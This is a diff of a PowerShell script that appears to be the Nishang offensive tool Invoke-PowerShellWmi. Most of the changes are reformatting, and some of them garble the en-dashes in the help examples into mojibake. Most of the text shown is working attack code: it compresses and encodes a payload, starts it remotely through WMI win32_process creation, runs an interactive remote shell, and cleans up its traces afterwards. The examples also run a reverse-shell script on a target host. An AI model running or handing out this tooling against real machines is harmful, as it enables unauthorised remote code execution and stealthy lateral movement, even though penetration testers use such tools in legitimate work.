@@ -58,7 +58,7 @@ Above example shows how to execute a PowerShell cmdlet interactively.
 
 .EXAMPLE
 
-PS C:\> Invoke-PowerShellWmi -ComputerName 192.168.0.35 -UserName opsdc\wmiadmin -Verbose –Payload 'powershell –c Get-Host'
+PS C:\> Invoke-PowerShellWmi -ComputerName 192.168.0.35 -UserName opsdc\wmiadmin -Verbose ï¿½Payload 'powershell ï¿½c Get-Host'
 
 Name             : ConsoleHost
 Version          : 5.1.14409.1005
@@ -75,7 +75,7 @@ Use above to use download-execute cradle to execute PowerShell scripts.
 
 .EXAMPLE
 
-PS C:\> Invoke-PowerShellWmi -ComputerName 192.168.0.35 -UserName opsdc\wmiadmin -Verbose –PayloadScript C:\test\reverse.ps1
+PS C:\> Invoke-PowerShellWmi -ComputerName 192.168.0.35 -UserName opsdc\wmiadmin -Verbose ï¿½PayloadScript C:\test\reverse.ps1
 
 Use above to load local scripts on the target system non-interactively.
 
@@ -89,18 +89,19 @@ http://www.patch-tuesday.net/2015/04/wmisploit.html
 https://github.com/secabstraction/WmiSploit
 https://github.com/samratashok/nishang
 #>
-    [CmdletBinding()] Param(
+    [CmdletBinding()]
+    Param (
         [Parameter(Position = 0, Mandatory = $True)]
         [Alias("IPAddress")]
         [String]
         $ComputerName,
-    
+
         [Parameter(Position = 1, Mandatory = $False)]
         [ValidateNotNull()]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]
         $UserName = [System.Management.Automation.PSCredential]::Empty,
-                
+
         [Parameter(Position = 2, Mandatory = $False)]
         [String]
         $Payload,
@@ -112,17 +113,15 @@ https://github.com/samratashok/nishang
         [Parameter()]
         [Switch]
         $Interactive,
-    
+
         [Parameter(Position = 4, Mandatory = $False)]
         [String]
         $Namespace = "root\default",
-    
+
         [Parameter(Position = 5, Mandatory = $False)]
         [String]
         $Tag = "SYSINFOS"
-
     )
-    
     function Execute-WmiCommand ($RemotePayload)
     {
         Write-Verbose "Sending given command to a scriptblock"
@@ -143,73 +142,68 @@ https://github.com/samratashok/nishang
             if (`$WmiEncoded.Length -gt 5500) {
                 `$LastPiece = `$WmiEncoded.Substring(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
                 `$WmiEncoded = `$WmiEncoded.Remove(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
-                for(`$i = 1; `$i -le `$NumberOfPieces; `$i++) { 
+                for(`$i = 1; `$i -le `$NumberOfPieces; `$i++) {
 	                `$piece = `$WmiEncoded.Substring(0,5500)
 		            `$WmiEncoded = `$WmiEncoded.Substring(5500,(`$WmiEncoded.Length - 5500))
 		            Insert-Piece `$i `$piece
                 }
                 `$WmiEncoded = `$LastPiece
             }
-	        Insert-Piece (`$NumberOfPieces + 1) `$WmiEncoded 
+	        Insert-Piece (`$NumberOfPieces + 1) `$WmiEncoded
 	        Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='OUTPUT_READY'}
 "@
-            Write-Verbose "Creating Scriptblock to execute on $ComputerName"
-            $ScriptBlock = [scriptblock]::Create($RemoteScript)
-                
-            # Compress and Encode the scriptblock
-            #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
-            $ms = New-Object IO.MemoryStream
-            $action = [IO.Compression.CompressionMode]::Compress
-            $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
-            $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
-            $ScriptBlock | ForEach-Object {$sw.WriteLine($_)}
-            $sw.Close()
-            # Base64 encode stream
-            $Compressed = [Convert]::ToBase64String($ms.ToArray())
-                
-            $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +
+        Write-Verbose "Creating Scriptblock to execute on $ComputerName"
+        $ScriptBlock = [scriptblock]::Create($RemoteScript)
 
-            "`$(New-Object IO.Compression.DeflateStream (" +
+        # Compress and Encode the scriptblock
+        #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
+        $ms = New-Object IO.MemoryStream
+        $action = [IO.Compression.CompressionMode]::Compress
+        $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
+        $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
+        $ScriptBlock | ForEach-Object {$sw.WriteLine($_)}
+        $sw.Close()
+        # Base64 encode stream
+        $Compressed = [Convert]::ToBase64String($ms.ToArray())
 
-            "`$(New-Object IO.MemoryStream (,"+
+        $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +
+        "`$(New-Object IO.Compression.DeflateStream (" +
+        "`$(New-Object IO.MemoryStream (,"+
+        "`$([Convert]::FromBase64String('$Compressed')))), " +
+        "[IO.Compression.CompressionMode]::Decompress)),"+
+        " [Text.Encoding]::ASCII)).ReadToEnd();"
 
-            "`$([Convert]::FromBase64String('$Compressed')))), " +
+        #Generate Base64 encoded command to use with the powershell -encodedcommand paramter
+        $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
+        $EncScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
+        #Check for max. length supported by Windows. If the base64 encoded command is longer use the other one.
+        if (($EncScript.Length -gt 8190) -or ($PostScriptCommand -eq $True))
+        {
+            $EncodedScript = $Command
+        }
+        else
+        {
+            $EncodedScript = $EncScript
+        }
 
-            "[IO.Compression.CompressionMode]::Decompress)),"+
+        $EncodedPosh = "powershell.exe -e $EncodedScript"
+        Write-Verbose "Executing scriptblock on $ComputerName"
+        Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $EncodedPosh | Out-Null
 
-            " [Text.Encoding]::ASCII)).ReadToEnd();"
-        
-            #Generate Base64 encoded command to use with the powershell -encodedcommand paramter
-            $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
-            $EncScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($command))
-            #Check for max. length supported by Windows. If the base64 encoded command is longer use the other one.
-            if (($EncScript.Length -gt 8190) -or ($PostScriptCommand -eq $True))
-            {
-                $EncodedScript = $Command
-            }
-            else
-            {
-                $EncodedScript = $EncScript
-            }
-                
-            $EncodedPosh = "powershell.exe -e $EncodedScript"
-            Write-Verbose "Executing scriptblock on $ComputerName"
-            Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $EncodedPosh | Out-Null
-                    
-            # Wait for script to finish writing output to WMI namespaces
-            $outputReady = ""
-            do
-            {
-                Write-Verbose "Waiting for the scriptblock on $ComputerName to finish executing."
-                $outputReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"
-            }
-            until($outputReady)
+        # Wait for script to finish writing output to WMI namespaces
+        $outputReady = ""
+        do
+        {
+            Write-Verbose "Waiting for the scriptblock on $ComputerName to finish executing."
+            $outputReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"
+        }
+        until($outputReady)
 
-            Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
-                    
-            # Retrieve cmd output written to WMI namespaces
-            Write-Verbose "Retrieving command output" 
-            Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName -Namespace $Namespace -Tag $Tag
+        Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
+
+        # Retrieve cmd output written to WMI namespaces
+        Write-Verbose "Retrieving command output"
+        Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName -Namespace $Namespace -Tag $Tag
     }
 
     if ($Interactive)
@@ -217,23 +211,22 @@ https://github.com/samratashok/nishang
         # Start a custom prompt
         $Command = ""
         $Shell = "powershell -noprofile -c "
-        do{ 
+        do {
             # Make a pretty prompt for the user to provide commands at
-            Write-Host ("[" + $($ComputerName) + "]: > ") -nonewline -foregroundcolor green 
+            Write-Host ("[" + $($ComputerName) + "]: > ") -nonewline -foregroundcolor green
             $Command = Read-Host
 
-            # Execute commands on remote host 
+            # Execute commands on remote host
             switch ($Command) {
-                "exit" { 
+                "exit" {
                     Write-Verbose "Cleaning up the target system"
                     Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
                 }
-                default { 
-                    
+                default {
                     Execute-WmiCommand "$Command" + "$Shell"
                 }
             }
-        }until($Command -eq "exit")
+        } until($Command -eq "exit")
     }
     elseif ($Payload)
     {
@@ -245,7 +238,7 @@ https://github.com/samratashok/nishang
     {
         #Logic to read, compress and Base64 encode the payload script.
         $Enc = Get-Content $PayloadScript -Encoding Ascii
-    
+
         #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
         $ms = New-Object IO.MemoryStream
         $action = [IO.Compression.CompressionMode]::Compress
@@ -253,20 +246,15 @@ https://github.com/samratashok/nishang
         $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
         $Enc | ForEach-Object {$sw.WriteLine($_)}
         $sw.Close()
-    
+
         # Base64 encode stream
         $Compressed = [Convert]::ToBase64String($ms.ToArray())
-    
+
         $command = "Invoke-Expression `$(New-Object IO.StreamReader (" +
-
         "`$(New-Object IO.Compression.DeflateStream (" +
-
         "`$(New-Object IO.MemoryStream (,"+
-
         "`$([Convert]::FromBase64String('$Compressed')))), " +
-
         "[IO.Compression.CompressionMode]::Decompress)),"+
-
         " [Text.Encoding]::ASCII)).ReadToEnd();"
 
         #Generate Base64 encoded command to use with the powershell -encodedcommand paramter"
@@ -278,8 +266,6 @@ https://github.com/samratashok/nishang
         Write-Verbose "Cleaning up the target system"
         Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
     }
-
-
     function Get-WmiShellOutput
     {
 
@@ -287,58 +273,56 @@ https://github.com/samratashok/nishang
             [Parameter(Position = 0, Mandatory = $True)]
             [String]
             $ComputerName,
-    
+
             [Parameter(Position = 1, Mandatory = $False)]
             [ValidateNotNull()]
             [System.Management.Automation.PSCredential]
             [System.Management.Automation.Credential()]
             $UserName = [System.Management.Automation.PSCredential]::Empty,
-    
+
             [Parameter(Position = 2, Mandatory = $False)]
             [String]
             $Namespace = "root\default",
-    
+
             [Parameter(Position = 3, Mandatory = $False)]
             [String]
             $Tag
-        ) 
-	
-	    $GetOutput = @() 
+        )
+
+	    $GetOutput = @()
 	    $GetOutput = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace root\default `
                         -Query "SELECT Name FROM __Namespace WHERE Name like '$Tag%'" | % {$_.Name} | Sort-Object
-	
-	    if ([BOOL]$GetOutput.Length) 
+
+	    if ([BOOL]$GetOutput.Length)
         {
-		
 	        $Reconstructed = New-Object System.Text.StringBuilder
             Write-Verbose "Decoding the encoded output."
             #Decode Base64 output
-		    foreach ($line in $GetOutput) 
+		    foreach ($line in $GetOutput)
             {
 			    $WmiToBase64 = $line.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
                 $WmiToBase64 = $WmiToBase64.Remove($WmiToBase64.Length - 14, 14)
 	            $null = $Reconstructed.Append($WmiToBase64)
             }
-            if ($Reconstructed.ToString().Length % 4 -ne 0) 
-            { 
-                $null = $Reconstructed.Append(("===").Substring(0, 4 - ($Reconstructed.ToString().Length % 4))) 
+            if ($Reconstructed.ToString().Length % 4 -ne 0)
+            {
+                $null = $Reconstructed.Append(("===").Substring(0, 4 - ($Reconstructed.ToString().Length % 4)))
             }
             $Decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Reconstructed.ToString()))
             Write-Output $Decoded
-        }	
+        }
         #Decode single line Base64
-	    else 
-        { 
+	    else
+        {
 		    $GetOutput
             $GetString = $GetOutput.Name
 		    $WmiToBase64 = $GetString.Remove(0,14) -replace [char]0x00F3,[char]0x002B -replace '_','/'
-		    if ($WmiToBase64.length % 4 -ne 0) 
+		    if ($WmiToBase64.length % 4 -ne 0)
             { 
-                $WmiToBase64 += ("===").Substring(0,4 - ($WmiToBase64.Length % 4)) 
+                $WmiToBase64 += ("===").Substring(0, 4 - ($WmiToBase64.Length % 4))
             }
             $DecodedOutput = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($WmiToBase64))
-		    Write-Output $DecodedOutput    
+		    Write-Output $DecodedOutput
         }
     }
 }
-
